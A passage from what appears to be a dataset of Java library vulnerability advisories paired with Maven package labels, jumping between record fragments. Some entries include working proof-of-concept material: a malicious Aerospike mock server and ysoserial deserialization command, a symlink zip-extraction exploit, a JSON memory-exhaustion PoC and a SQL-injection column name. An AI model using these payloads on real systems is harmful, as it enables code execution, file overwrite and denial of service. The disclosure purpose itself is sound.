case:\n\n[`client/src/com/aerospike/client/command/Buffer.java:53`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53)\n\n```java\npublic static Object bytesToParticle(int type, byte[] buf, int offset, int len)\n    throws AerospikeException {\n        switch (type) {\n            // --snip--\n            case ParticleType.JBLOB:\n                return Buffer.bytesToObject(buf, offset, len);\n```\n\nIn `bytesToObject`, the deserialization of an object from the message bytes happens:\n\n[`client/src/com/aerospike/client/command/Buffer.java:300`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L300)\n\n```java\npublic static Object bytesToObject(byte[] buf, int offset, int length) {\n    // --snip--\n    try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) {\n        try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {\n            return oistream.readObject();\n        }\n    }\n    // --snip--\n}\n```\n\nNOTE: Take into account that there exists a similar sink, that can be reached in a similar way, in `Unpacker.unpackBlock`:\n\n[`client/src/com/aerospike/client/util/Unpacker.java:227`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227)\n\n```java\nprivate T unpackBlob(int count) throws IOException, ClassNotFoundException {\n    // --snip--\n    case ParticleType.JBLOB:\n        // --snip--\n        try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) {\n            try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {\n                val = getJavaBlob(oistream.readObject());\n            }\n        }\n```\n\nThis vulnerability was discovered with the help of [CodeQL](https://codeql.github.com/).\n\n#### Impact\n\nThis issue may lead to Remote Code Execution (RCE) in the Java client.\n\n#### Remediation\n\nAvoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML.  However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.\n\nAlternatively, a tightly controlled whitelist can limit the vulnerability of code but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.\n\n#### Resources\n\nTo exploit this vulnerability, a malicious Aerospike server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client. To be able to easily reproduce this, we used the client's examples with the `-netty` flag, specifically the `AsyncPutGet`, which uses an `AsyncRead`. The examples point to `localhost:3000` by default, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Aerospike server and returns them to the client, until the `AsyncRead` command happens. Then, our server injects the malicious response:\n\n```java\npublic class AttackChannelHandler extends SimpleChannelInboundHandler<String> {\n\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {\n        // --snip--\n        if (s.getBytes()[7] == 0x44) {\n            AttackMessage m = new AttackMessage(\n                    Files.readAllBytes(Paths.get(\"location/of/deserialization/payload.bin\")));\n            ctx.channel().writeAndFlush(m);\n            return;\n        }\n        // --snip--\n    }\n}\n```\n\n`AttackMessage` is a class that hardcodes the necessary data to deliver the payload:\n\n```java\npublic class AttackMessage {\n\n    private byte resultCode = 0;\n    private int generation = 2;\n    private int expiration = 417523457;\n    private short fieldCount = 0;\n    private short opCount = 1;\n    private byte particleType = 7;\n    private String name = \"putgetbin\";\n    private byte[] payload;\n\n    public AttackMessage(byte[] payload) {\n        this.payload = payload;\n    }\n\n    // --snip-- (getters)\n\n    public int[] getSize() {\n        int size = 30 + name.length() + payload.length;\n        int low = (byte) (size & 0xFF);\n        int high = (byte) (size >> 8) & 0xFF;\n        return new int[] {high, low};\n    }\n\n    public int getOpSize() {\n        return payload.length + 4 + name.length();\n    }\n\n    public byte[] getPayload() {\n        return payload;\n    }\n}\n```\n\nAnd it's finally encoded and delivered to the client through the network using a `MessageToByteEncoder` from Netty:\n\n```java\npublic class AttackMessageEncoder extends MessageToByteEncoder<AttackMessage> {\n\n    @Override\n    protected void encode(ChannelHandlerContext ctx, AttackMessage msg, ByteBuf out)\n            throws Exception {\n        // header\n        out.writeBytes(new byte[] {0x02, 0x03, 0x00, 0x00, 0x00, 0x00});\n        int[] length = msg.getSize();\n        out.writeByte(length[0]);\n        out.writeByte(length[1]);\n\n        out.writeBytes(new byte[] {0x16, 0x00, 0x00, 0x00, 0x00});\n        out.writeByte(msg.getResultCode());\n        out.writeInt(msg.getGeneration());\n        out.writeInt(msg.getExpiration());\n\n        out.writeBytes(new byte[] {0x00, 0x00, 0x00, 0x00});\n        out.writeShort(msg.getFieldCount());\n        out.writeShort(msg.getOpCount());\n        out.writeInt(msg.getOpSize());\n\n        out.writeByte(0x01);\n        out.writeByte(msg.getParticleType());\n\n        out.writeByte(0x00);\n        out.writeByte(msg.getName().length());\n        out.writeCharSequence(msg.getName(), Charset.defaultCharset());\n        out.writeBytes(msg.getPayload());\n    }\n\n}\n```\n\nThe specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using the Aerospike client. Again, for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:\n\n```xml\n<dependency>\n  <groupId>org.apache.commons</groupId>\n  <artifactId>commons-collections4</artifactId>\n  <version>4.0</version>\n</dependency>\n```\n\nIn which case, the malicious payload file could be generated using [`ysoserial`](https://github.com/frohoff/ysoserial) as follows:\n\n```\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' > payload.bin\n```\n\n## GitHub Security Advisories\n\nWe recommend you create a private [GitHub Security Advisory](https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory) for this finding.

The format for the PAX extended headers carrying this data consists of two numbers separated by a period [2], indicating seconds and subsecond precision (for example \u201c1647221103.5998539\u201d). The impacted fields are \u201catime\u201d, \u201cctime\u201d, \u201cmtime\u201d and \u201cLIBARCHIVE.creationtime\u201d. No input validation is performed prior to the parsing of header values.\n\nParsing of these numbers uses the BigDecimal [3] class from the JDK which has a publicly known algorithmic complexity issue when doing operations on large numbers, causing denial of service (see issue # JDK-6560193 [4]). A third party can manipulate file time headers in a TAR file by placing a number with a very long fraction (300,000 digits) or a number with exponent notation (such as \u201c9e9999999\u201d) within a file modification time header, and the parsing of files with these headers will take hours instead of seconds, leading to a denial of service via exhaustion of CPU resources.

Its SnappyInputStream was found to be vulnerable to Denial of Service (DoS) attacks when decompressing data with a too-large chunk size. Due to missing upper bound check on chunk length, an unrecoverable fatal error can occur. \n\n### Scope\n\nAll versions of snappy-java including the latest released version 1.1.10.3.

A bug in the parser means that an input string of modest size can lead to indefinite amounts of memory being used. There are two issues: (1) the parser bug can be used to circumvent a check that is supposed to prevent the key in a JSON object from itself being another JSON object; (2) if a key does end up being a JSON object then it gets converted into a string, using `\\` to escape special characters, including `\\` itself. So by nesting JSON objects, with a key that is a JSON object that has a key that is a JSON object, and so on, we can get an exponential number of `\\` characters in the escaped string.\n\n### Severity\nHigh - Because this is an already-fixed DoS vulnerability, the only remaining impact possible is for existing binaries that have not been updated yet.\n\n### Proof of Concept\n```java\npackage orgjsonbug;\n\nimport org.json.JSONObject;\n\n/**\n * Illustrates a bug in JSON-Java.\n */\npublic class Bug {\n  private static String makeNested(int depth) {\n    if (depth == 0) {\n      return \"{\\\"a\\\":1}\";\n    }\n    return \"{\\\"a\\\":1;\\t\\0\" + makeNested(depth - 1) + \":1}\";\n  }\n\n  public static void main(String[] args) {\n    String input = makeNested(30);\n    System.out.printf(\"Input string has length %d: %s\\n\", input.length(), input);\n    JSONObject output = new JSONObject(input);\n    System.out.printf(\"Output JSONObject has length %d: %s\\n\", output.toString().length(), output);\n  }\n}\n```\nWhen run, this reports that the input string has length 367.

The minimum versions containing patch for this vulnerability are 4.4.0.12 and 4.3.0.12.\n\n### Workarounds\nIf you cannot upgrade the library, you can control the\u00a0[allowlist of the ](https://neo4j.com/docs/operations-manual/current/reference/configuration-settings/#config_dbms.security.procedures.allowlist)procedures\u00a0that can be used in your system, and/or turn off local file access by setting apoc.export.file.enabled=false\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in\u00a0[neo4j-apoc-procedures](https://github.com/neo4j-contrib/neo4j-apoc-procedures)\n* Email us at\u00a0[security@neo4j.com](mailto:security@neo4j.com)\n\n### Credits\nWe want to publicly recognise the contribution Adam Reziouk - Airbus.", "labels": ["org.neo4j.procedure:apoc", "org.neo4j.procedure:apoc"]}, {"cve_id": "CVE-2023-24439", "desc": "Jenkins JIRA Pipeline Steps Plugin 2.0.165.v8846cf59f3db and earlier stores the private keys unencrypted in its global configuration file on the Jenkins controller where it can be viewed by users with access to the Jenkins controller file system.", "labels": ["org.jenkins-ci.plugins:jira-steps"]}, {"cve_id": "CVE-2023-24457", "desc": "A cross-site request forgery (CSRF) vulnerability in Jenkins Keycloak Authentication Plugin 2.3.0 and earlier allows attackers to trick users into logging in to the attacker's account.", "labels": ["org.jenkins-ci.plugins:keycloak"]}, {"cve_id": "CVE-2023-24455", "desc": "Jenkins visualexpert Plugin 1.3 and earlier does not restrict the names of files in methods implementing form validation, allowing attackers with Item/Configure permission to check for the existence of an attacker-specified file path on the Jenkins controller file system.", "labels": ["io.jenkins.plugins:visualexpert"]}, {"cve_id": "CVE-2023-24435", "desc": "A missing permission check in Jenkins GitHub Pull Request Builder Plugin 1.42.2 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins.", "labels": ["org.jenkins-ci.plugins:ghprb"]}, {"cve_id": "CVE-2023-24452", "desc": "A cross-site request forgery (CSRF) vulnerability in Jenkins TestQuality Updater Plugin 1.3 and earlier allows attackers to connect to an attacker-specified URL using attacker-specified username and password.", "labels": ["org.jenkins-ci.plugins:testquality-updater"]}, {"cve_id": "CVE-2022-45935", "desc": "Usage of temporary files with insecure permissions by the Apache James server allows an attacker with local access to access private user data in transit.

But if it doesn\u2019t - \nit will return NULL and we will reach the else\u2019s clause, which will eventually return the path of the symlink itself.\nSo in case the entry is already exists as a symbolic link to a non-existing file - file.getCanonicalFile() will return the absolute path of the symbolic link and this check will pass:\n```java\nPath canonicalDirPath = dir.getCanonicalFile().toPath();\nPath canonicalDestPath = targetFileName.getCanonicalFile().toPath();\n\n\nif ( !canonicalDestPath.startsWith( canonicalDirPath ) )\n{\n    throw new ArchiverException( \"Entry is outside of the target directory (\" + entryName + \")\" );\n}\n```\nLater, the content of the entry will be written to the symbolic link\u2019s destination and by doing so will create the destination file and fill it with the entry\u2019s content.\n\nArbitrary file creation can lead to remote code execution. For example, if there is an SSH server on the victim\u2019s machine and ~/.ssh/authorized_keys does not exist - creating this file and filling it with an attacker's public key will allow the attacker to connect the SSH server without knowing the victim\u2019s password.\n\n### PoC\nWe created a zip as following:\n```bash\n$ ln -s /tmp/target entry1\n$ echo -ne \u201ccontent\u201d > entry2\n$ zip  --symlinks archive.zip entry1 entry2\n```\nThe following command will change the name of entry2 to entry1:\n```bash\n$ sed -i 's/entry2/entry1/' archive.zip\n```\nWe put archive.zip in /tmp and create a dir for the extracted files:\n```bash\n$ cp archive.zip /tmp\n$ mkdir /tmp/extracted_files\n```\nNext, we wrote a java code that opens archive.zip:\n```java\npackage com.example;\n\nimport java.io.File;\n\nimport org.codehaus.plexus.archiver.zip.ZipUnArchiver;\n\npublic class App \n{\n    public static void main( String[] args )\n    {\n        ZipUnArchiver unArchiver = new ZipUnArchiver(new File(\"/tmp/archive.zip\"));\n        unArchiver.setDestDirectory(new File(\"/tmp/extracted_files\"));\n        unArchiver.extract();        \n    }\n}\n```\nAfter running this java code, we can see that /tmp/target contains the string \u201ccontent\u201d:\n```\n$ cat /tmp/target\ncontent\n```\nNotice that although we used here a duplicated entry name in the same archive, this attack can be performed also by two different archives - one that contains a symlink and another archive that contains a regular file with the same entry name as the symlink.", "labels": ["org.codehaus.plexus:plexus-archiver"]}, {"cve_id": "CVE-2023-41044", "desc": "A partial path traversal vulnerability exists in Graylog's [Support Bundle](https://go2docs.graylog.org/5-1/making_sense_of_your_log_data/cluster_support_bundle.htm) feature.

Perform the following API request repeatedly with curl (with `<session-id>` replaced with the session id from step 2 and `<lb-host>` replaced with the hostname of your load balancer):\n    ```\n    curl -I -H X-Graylog-No-Session-Extension:true https://<session-id>:session@<lb-host>/api/system/cluster/nodes\n    ```\n1. Notice that the request is sometimes rejected, but sometimes succeeds\n\n\n### Impact\n\nNo session identifiers are leaked.\n\nAfter a user has logged out, the UI shows the login screen again, which gives the user the impression that their session is not valid anymore. However, if the session becomes compromised later, it can still be used to perform API requests against the Graylog cluster. The time frame for this is limited to the configured session lifetime, starting from the time when the user logged out.\n\n\n", "labels": ["org.graylog2:graylog2-server", "org.graylog2:graylog2-server"]}, {"cve_id": "CVE-2023-32263", "desc": "A potential vulnerability has been identified in the Micro Focus Dimensions CM Plugin for Jenkins.

If executing on the default dispatcher and `akka.jvm-exit-on-fatal-error` is enabled\u2014as it is by default\u2014then this can crash the application process.\n\n`Form.bindFromRequest` is vulnerable when using any body parser that produces a type of `AnyContent` or `JsValue` in Scala, or one that can produce a `JsonNode` in Java. This includes Play's default body parser.\n\n### Patches\n\nThis vulnerability been patched in version 2.8.16. There is now a global limit on the depth of a JSON object that can be parsed, which can be configured by the user if necessary.\n\n### Workarounds\n\nApplications that do not need to parse a request body of type `application/json` can switch from the default body parser to another body parser that supports only the specific type of body they expect; for example, the `formUrlEncoded` body parser can be used if the Play action only needs to accept `application/x-www-form-urlencoded`.\n\n", "labels": ["com.typesafe.play:play_2.13", "com.typesafe.play:play_2.12"]}, {"cve_id": "CVE-2022-34179", "desc": "Jenkins Embeddable Build Status Plugin 2.0.3 and earlier allows specifying a `style` query parameter that is used to choose a different SVG image style without restricting possible values, resulting in a relative path traversal vulnerability that allows attackers without Overall/Read permission to specify paths to other SVG images on the Jenkins controller file system.\n\nEmbeddable Build Status Plugin 2.0.4 restricts the `style` query parameter to one of the three legal values.", "labels": ["org.jenkins-ci.plugins:embeddable-build-status"]}, {"cve_id": "CVE-2022-34173", "desc": "Since Jenkins 2.340, the tooltip of the build button in list views supports HTML without escaping the job display name.\n\nThis vulnerability is known to be exploitable by attackers with Job/Configure permission.\n\nJenkins 2.356 addresses this vulnerability.

The fix is also included in 4.4.0 and later releases.\n\nNote: 4.3.0 does not have the vulnerability, but does not include the patch to re-encrypt plain text values if 4.2.0 or 4.2.1 were used.  The previously release 4.3.1 and 4.2.2 versions missed some re-encryption use cases that have been fixed in the versions mentioned above.\n\n### Workarounds\n\nTo prevent plaintext credentials from being stored in Rundeck 4.2.0/4.2.1, write access to key storage can be disabled via ACLs. After upgrading to 4.3.1 or later, write access can be restored.\n\nThis aclpolicy document can be used to deny all write access to storage:\n\n```\n---\nby:\n  group: '.*'\ncontext:\n  application: rundeck\nfor:\n  storage:\n  - deny:\n    - create\n    - update\ndescription: deny create or update for storage in application context\n---\nby:\n  group: '.*'\ncontext:\n  project: .*\nfor:\n  storage:\n  - deny:\n    - create\n    - update\ndescription: deny create or update for storage in project context\n```\n\nTo remove plaintext credentials, the metadata of stored keys can be used to detect if the key was stored with encryption enabled or not.  In the case of the \u201cjasypt-encryption\u201d plugin, encrypted values will have a metadata field of \u201cjasypt-encryption:encrypted\u201d:\u201dtrue\u201d in the JSON metadata.  If you are using the relational database as your key storage backend (rundeck.storage.provider.1.type=db), you can query for keys that are unencrypted. Here is an example query for Mysql:\n\n```\nselect id,dir,name from storage where json_data not like \"%jasypt-encryption:encrypted\\\":\\\"true%\" and namespace is null and dir like \"keys%\"\n```\n\n### References\n\nConfiguration Settings for Storage Converters: https://docs.rundeck.com/docs/administration/configuration/plugins/configuring.html#storage-converter-plugins\n\nAbout Storage Converters:\nhttps://docs.rundeck.com/docs/manual/key-storage/key-storage.html#key-data-storage-converter\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [our forums](https://community.pagerduty.com/forum/c/process-automation)\n* Enterprise Customers can open a [Support ticket](https://support.rundeck.com)\n", "labels": ["org.rundeck:rundeck", "org.rundeck:rundeck"]}, {"cve_id": "CVE-2022-34186", "desc": "Jenkins Dynamic Extended Choice Parameter Plugin 1.0.1 and earlier does not escape the name and description of Moded Extended Choice parameters on views displaying parameters, resulting in a stored cross-site scripting (XSS) vulnerability exploitable by attackers with Item/Configure permission.\n\nExploitation of this vulnerability requires that parameters are listed on another page, like the \\\"Build With Parameters\\\" and \\\"Parameters\\\" pages provided by Jenkins (core), and that those pages are not hardened to prevent exploitation.

Play does this by configuring its `DefaultHttpErrorHandler` to do so based on the application mode. In its Scala API Play also provides a static object `DefaultHttpErrorHandler` that is configured to always show verbose errors. This is used as a default value in some Play APIs, so it is possible to inadvertently use this version in production. It is also possible to improperly configure the `DefaultHttpErrorHandler` object instance as the injected error handler.  Both of these situations could result in verbose errors displaying to users in a production application, which could expose sensitive information from the application.\n\nIn particular the constructor for `CORSFilter` and `apply` method for `CORSActionBuilder` use the static object `DefaultHttpErrorHandler` as a default value.\n\n### Patches\n\nThis is patched in Play Framework 2.8.16. The `DefaultHttpErrorHandler` object has been changed to use the prod-mode behavior, and `DevHttpErrorHandler` has been introduced for the dev-mode behavior.\n\n### Workarounds\n\nWhen constructing a `CORSFilter` or `CORSActionBuilder`, ensure that a properly-configured error handler is passed. Generally this should be done by using the `HttpErrorHandler` instance provided through dependency injection or through Play's `BuiltInComponents`. Ensure that your application is not using the `DefaultHttpErrorHandler` static object in any code that may be run in production.\n\n### References\nhttps://www.playframework.com/documentation/2.8.x/ScalaErrorHandling#Supplying-a-custom-error-handler\nhttps://www.playframework.com/documentation/2.8.x/JavaErrorHandling#Supplying-a-custom-error-handler\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [playframework/playframework](https://github.com/playframework/playframework/)\n* Email us at [example email address](mailto:example@example.com)\n", "labels": ["com.typesafe.play:play_2.12", "com.typesafe.play:play_2.13"]}, {"cve_id": "CVE-2022-34175", "desc": "Jenkins uses the Stapler web framework to render its UI views.

If you only use HashMap or HashSet and your XML refers these only as default map or set, you may additionally change the default implementation of java.util.Map and java.util.Set at unmarshalling time::\n```Java\nxstream.addDefaultImplementation(java.util.TreeMap.class, java.util.Map.class);\nxstream.addDefaultImplementation(java.util.TreeSet.class, java.util.Set.class);\n```\nHowever, this implies that your application does not care about the implementation of the map and all elements are comparable.\n\n### References\nSee full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2022-41966](https://x-stream.github.io/CVE-2022-41966.html).\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)\n* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)\n", "labels": ["com.thoughtworks.xstream:xstream"]}, {"cve_id": "CVE-2022-3916", "desc": "An issue was discovered in Keycloak when using a client with the `offline_access` scope.

The detailed error information embedded in `internal.jsp` is not necessary for the JSPUI to function.\n\n#### Apply the patch to your DSpace\nIf at all possible, we recommend upgrading your DSpace site based on the upgrade instructions. However, if you are unable to do so, you can manually apply the above patches as follows:\n1. Download the appropriate patch file to the machine where DSpace is running\n2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`\n3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:\n    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace code)\n    2. Redeploy DSpace, e.g. `ant update`  (This will copy all updated WARs / configs to your installation directory). Depending on your setup you also may need to copy the updated WARs over to your Tomcat webapps folder.\n    3. Restart Tomcat\n\n### Workarounds\n\nThe detailed error information embedded in `internal.jsp` is not necessary for the JSPUI to function.  Because this error information is also available in the `dspace.log` files, it does not need to be displayed in `internal.jsp`.\n\nModify your `internal.jsp`, and disable the display of the error message.

Who is impacted?_\n\nThe PGJDBC implementation of the `java.sql.ResultRow.refreshRow()` method is not performing escaping of column names so a malicious column name that contains a statement terminator, e.g. `;`, could lead to SQL injection. This could lead to executing additional SQL commands as the application's JDBC user.\n\nUser applications that do not invoke the `ResultSet.refreshRow()` method are not impacted.\n\nUser application that do invoke that method are impacted if the underlying database that they are querying via their JDBC application may be under the control of an attacker. The attack requires the attacker to trick the user into executing SQL against a table name who's column names would contain the malicious SQL and subsequently invoke the `refreshRow()` method on the ResultSet.\n\nFor example:\n\n```sql\nCREATE TABLE refresh_row_example (\n  id     int PRIMARY KEY,\n  \"1 FROM refresh_row_example; SELECT pg_sleep(10); SELECT * \" int\n);\n```\n\nThis example has a table with two columns. The name of the second column is crafted to contain a statement terminator followed by additional SQL. Invoking the `ResultSet.refreshRow()` on a ResultSet that queried this table, e.g. `SELECT * FROM refresh_row`, would cause the additional SQL commands such as the `SELECT pg_sleep(10)` invocation to be executed.\n\nAs the multi statement command would contain multiple results, it would not be possible for the attacker to get data directly out of this approach as the `ResultSet.refreshRow()` method would throw an exception. However, the attacker could execute any arbitrary SQL including inserting the data into another table that could then be read or any other DML / DDL statement.\n\nNote that the application's JDBC user and the schema owner need not be the same. A JDBC application that executes as a privileged user querying database schemas owned by potentially malicious less-privileged users would be vulnerable. In that situation it may be possible for the malicious user to craft a schema that causes the application to execute commands as the privileged user.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nYes, versions 42.2.26, 42.3.7, and 42.4.1 have been released with a fix.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nCheck that you are not using the `ResultSet.refreshRow()` method.\n\nIf you are, ensure that the code that executes that method does not connect to a database that is controlled by an unauthenticated or malicious user. If your application only connects to its own database with a fixed schema with no DDL permissions, then you will not be affected by this vulnerability as it requires a maliciously crafted schema.\n", "labels": ["org.postgresql:postgresql", "org.postgresql:postgresql", "org.postgresql:postgresql"]}, {"cve_id": "CVE-2022-36599", "desc": "Mingsoft MCMS 5.2.8 was discovered to contain a SQL injection vulnerability in /mdiy/model/delete URI via models Lists.", "labels": ["net.mingsoft:ms-mcms"]}, {"cve_id": "CVE-2022-25168", "desc": "Apache Hadoop's `FileUtil.unTar(File, File)` API does not escape the input file name before being passed to the shell.

However, this path traversal vulnerability is only possible by a user with special privileges (either Administrators or someone with command-line access to the server).

However, if you are unable to do so, you can manually apply the above patches as follows:\n1. Download the appropriate patch file to the machine where DSpace is running\n2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`\n3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:\n    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace code)\n    2. Redeploy DSpace, e.g. `ant update`  (This will copy all updated WARs / configs to your installation directory). Depending on your setup you also may need to copy the updated WARs over to your Tomcat webapps folder.\n    3. Restart Tomcat\n\n### Workarounds\n\nAs a basic workaround, you may block all access to the following URL paths:\n* If you are using the XMLUI, block all access to `/admin/batchimport` path (this is the URL of the Admin Batch Import tool). Keep in mind, if your site uses the path \"/xmlui\", then you'd need to block access to `/xmlui/admin/batchimport`.\n* If you are using the JSPUI, block all access to `/dspace-admin/batchimport` path (this is the URL of the Admin Batch Import tool).  Keep in mind, if your site uses the path \"/jspui\", then you'd need to block access to `/jspui/dspace-admin/batchimport`.\n\nKeep in mind, only an Administrative user or a user with command-line access to the server is able to import/upload SAF packages. Therefore, assuming those users do not blindly upload untrusted SAF packages, then it is unlikely your site could be impacted by this vulnerability.\n\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@dspace.org\n", "labels": ["org.dspace:dspace-api", "org.dspace:dspace-api"]}, {"cve_id": "CVE-2022-36272", "desc": "Mingsoft MCMS 5.2.8 was discovered to contain a SQL injection vulnerability in /mdiy/page/verify URI via fieldName parameter.", "labels": ["net.mingsoft:ms-mcms"]}, {"cve_id": "CVE-2022-0225", "desc": "A flaw was found in Keycloak.

The server notifies the client about changes only in case the value is changed. Each monitored item is configured on a subscription, each subscription is linked to a single OPC UA session. Most OPC UA implementations set many controls and limitations for excessive memory consumption. For example:\n\n* What is the maximum allowed number of concurrent sessions\n* For each active sessions - what is the maximum allowed number of concurrent subscription per a single session\n* For each active subscription - what is the maximum allowed number of concurrent monitored items per a single subscription\n\nClarity Research discovered a unique way to bypass those restrictions and fill up the OPC UA server process memory.\n\nThe close session request closes a connected session. A `deleteSubscription` flag is also sent in that message and determines whether the server should save the subscriptions for a future session reconnection or discard them upon session termination. If the `deleteSubscription` flag is `False` the server will store the subscriptions thus filling up the memory in an unlimited manner.\n\nSending multiple subscribe requests with multiple monitored items from multiple sessions will quickly fill up the process memory until the server crashes.\n\nTo trigger this bug all is needed is to create many sessions with subscriptions and monitored items without ever deleting the monitored items.

Clients need to ensure that messages decrypted with a key with `trusted = false` are decorated appropriately (for example, by showing a warning for such messages).\n\n### Workarounds\nCurrent users of the SDK can disable key forwarding in their forks using `CryptoService#enableKeyGossiping(enable: Boolean)`.\n\n### References\nBlog post: https://matrix.org/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients\n\n### For more information\nIf you have any questions or comments about this advisory, e-mail us at [security@matrix.org](mailto:security@matrix.org).\n", "labels": ["org.matrix.android:matrix-android-sdk2"]}, {"cve_id": "CVE-2022-41226", "desc": "Jenkins Compuware Common Configuration Plugin 1.0.14 and earlier does not configure its XML parser to prevent XML external entity (XXE) attacks.\n\nThis allows attackers able to change the contents of the Topaz Workbench CLI home directory on agents to have Jenkins parse a crafted file that uses external entities for extraction of secrets from the Jenkins controller or server-side request forgery.", "labels": ["com.compuware.jenkins:compuware-common-configuration"]}, {"cve_id": "CVE-2022-1278", "desc": "A flaw was found in WildFly, where an attacker can see deployment names, endpoints, and any other data the trace payload may contain.", "labels": ["org.wildfly.bom:wildfly"]}, {"cve_id": "CVE-2022-41228", "desc": "A missing permission check in Jenkins NS-ND Integration Performance Publisher Plugin 4.8.0.129 and earlier allows attackers with Overall/Read permissions to connect to an attacker-specified webserver using attacker-specified credentials.

Connections from the Pulsar Java Client to the Pulsar Broker/Proxy and connections from the Pulsar Proxy to the Pulsar Broker are vulnerable. Authentication data is sent before verifying the server\u2019s TLS certificate matches the hostname, which means authentication data could be exposed to an attacker. An attacker can only take advantage of this vulnerability by taking control of a machine 'between' the client and the server. The attacker must then actively manipulate traffic to perform the attack by providing the client with a cryptographically valid certificate for an unrelated host. Because the client sends authentication data before performing hostname verification, an attacker could gain access to the client\u2019s authentication data.

Because the client eventually closes the connection, the value of the intercepted authentication data depends on the authentication method used by the client.

If the site that this HTML is published on does not set a Content Security Policy, an XSS attack is then possible.\n\n### Impact\nSites that accept input HTML from users and use jsoup to sanitize that HTML, may be vulnerable to cross-site scripting (XSS) attacks, if they have enabled `SafeList.preserveRelativeLinks` and do not set an appropriate Content Security Policy.\n\n### Patches\nThis issue is patched in jsoup 1.15.3.\n\nUsers should upgrade to this version. Additionally, as the unsanitized input may have been persisted, old content should be cleaned again using the updated version.\n\n### Workarounds\nTo remediate this issue without immediately upgrading:\n\n- disable `SafeList.preserveRelativeLinks`, which will rewrite input URLs as absolute URLs\n- ensure an appropriate [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) is defined. (This should be used regardless of upgrading, as a defence-in-depth best practice.)\n\n### Background and root cause\njsoup includes a [Cleaner](https://jsoup.org/apidocs/org/jsoup/safety/Cleaner.html) component, which is designed to [sanitize input HTML](https://jsoup.org/cookbook/cleaning-html/safelist-sanitizer) against configurable safe-lists of acceptable tags, attributes, and attribute values.\n\nThis includes removing potentially malicious attributes such as `<a href=\"javascript:...\">`, which may enable XSS attacks. It does this by validating URL attributes against allowed URL protocols (e.g. `http`, `https`).\n\nHowever, an attacker may be able to bypass this check by embedding control characters into the href attribute value. This causes the Java URL class, which is used to resolve relative URLs to absolute URLs before checking the URL's protocol, to treat the URL as a relative URL. It is then resolved into an absolute URL with the configured base URI.\n\nFor example, `java\\tscript:...` would resolve to `https://example.com/java\\tscript:...`.\n\nBy default, when using a safe-list that allows `a` tags, jsoup will rewrite any relative URLs (e.g. `/foo/`) to an absolute URL (e.g. `https://example.com/foo/`). Therefore, this attack attempt would be successfully mitigated. However, if the option [SafeList.preserveRelativeLinks](https://jsoup.org/apidocs/org/jsoup/safety/Safelist.html#preserveRelativeLinks(boolean)) is enabled (which does not rewrite relative links to absolute), the input is left as-is.\n\nWhile Java will treat a path like `java\\tscript:` as a relative path, as it does not match the allowed characters of a URL spec, browsers may normalize out the control characters, and subsequently evaluate it as a `javascript:` spec inline expression. That disparity then leads to an XSS opportunity.\n\nSites defining a Content Security Policy that does not allow javascript expressions in link URLs will not be impacted, as the policy will prevent the script's execution.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [jsoup](https://github.com/jhy/jsoup)\n* Email the author of jsoup at [jonathan@hedley.net](mailto:jonathan@hedley.net)\n\n### Credits\nThanks to Jens H\u00e4derer, who reported this issue, and contributed to its resolution.", "labels": ["org.jsoup:jsoup"]}, {"cve_id": "CVE-2022-37734", "desc": "graphql-java before 19.0, 18.3, and 17.4 is vulnerable to Denial of Service.

